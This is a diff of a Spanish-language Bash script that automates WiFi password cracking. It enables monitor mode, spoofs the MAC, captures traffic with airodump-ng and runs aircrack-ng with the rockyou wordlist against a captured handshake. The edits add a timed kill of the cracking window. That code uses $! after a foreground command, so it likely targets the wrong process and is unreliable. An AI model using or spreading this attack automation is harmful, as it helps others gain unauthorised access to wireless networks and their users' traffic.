@@ -52,7 +52,7 @@ if [ $airtest -eq 0 ]; then
 			airmon-ng check kill > /dev/null 2>&1
 			echo -e "\n${yellowColour}[*] Nueva dirección MAC asignada: $(macchanger -s ${tar}mon | grep -i current | xargs | cut -d ' ' -f '3-100')"
 			echo -e "\n${greenColour}[*] Ya tienes tu tarjeta preparada!"
-			read -p "[?]Quieres hacer un ataque? [Y/N]: " rps
+			read -p "[?] Quieres hacer un ataque? [Y/N]: " rps
 				$cleancolor
 				if [ "$rps" == "Y" ] || [ "$rps" == "y" ]; then
 					xterm -hold -e "airodump-ng ${tar}mon" &
@@ -82,6 +82,10 @@ if [ $airtest -eq 0 ]; then
 					sudo gunzip -d rockyou.txt.gz > /dev/null 2>&1
 					
 					sleep 5; xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Handshake-01.cap"
+					aircrack_xterm_PID=$!
+
+					sleep 120; kill -9  $aircrack_xterm_PID
+					wait $aircrack_xterm_PID 2>/dev/null
 				fi
 			if [ "$rps" == "N" ] || [ "$rps" == "n" ]; then
 				echo -e "${redColour}\n[!] Saliendo"
